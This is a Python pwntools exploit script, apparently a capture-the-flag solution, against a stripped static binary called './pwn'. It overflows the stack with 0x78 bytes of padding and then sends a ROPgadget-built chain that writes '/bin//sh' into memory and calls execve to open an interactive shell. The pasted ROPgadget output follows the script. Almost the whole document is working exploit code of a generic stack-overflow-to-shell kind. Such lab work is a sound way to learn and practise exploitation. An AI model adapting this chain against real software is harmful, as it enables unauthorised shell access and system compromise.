from pwn import *
context.arch = 'amd64'
from struct import pack

# the program compile statically, and make symbol strip,
# but we could get function main by entry function start,
# then we kown the offset which could make stack overflow,
# because of it's compiled statically,we just use the ROPgadget to get rop chain and get shell

p = ''
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004494ac) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f261) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444840) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f261) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000449505) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444840) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040123c) # syscall

io = process('./pwn')
payload = 'A'*(0x70+8) + p
io.send('b') # pass the first read
io.send(payload)
io.interactive()
# ROPgadget --binary ./pwn --ropchain

# ROP chain generation
# ===========================================================

# - Step 1 -- Write-what-where gadgets

# 	[+] Gadget found: 0x47f261 mov qword ptr [rsi], rax ; ret
# 	[+] Gadget found: 0x4100d3 pop rsi ; ret
# 	[+] Gadget found: 0x4494ac pop rax ; ret
# 	[+] Gadget found: 0x444840 xor rax, rax ; ret

# - Step 2 -- Init syscall number gadgets

# 	[+] Gadget found: 0x444840 xor rax, rax ; ret
# 	[+] Gadget found: 0x4746b0 add rax, 1 ; ret
# 	[+] Gadget found: 0x4746b1 add eax, 1 ; ret

# - Step 3 -- Init syscall arguments gadgets

# 	[+] Gadget found: 0x400686 pop rdi ; ret
# 	[+] Gadget found: 0x4100d3 pop rsi ; ret
# 	[+] Gadget found: 0x449505 pop rdx ; ret

# - Step 4 -- Syscall gadget

# 	[+] Gadget found: 0x40123c syscall

# - Step 5 -- Build the ROP chain

# 	#!/usr/bin/env python2
# 	# execve generated by ROPgadget

# 	from struct import pack

# 	# Padding goes here
# 	p = ''
# 	......
# 	p += pack('<Q', 0x000000000040123c) # syscall
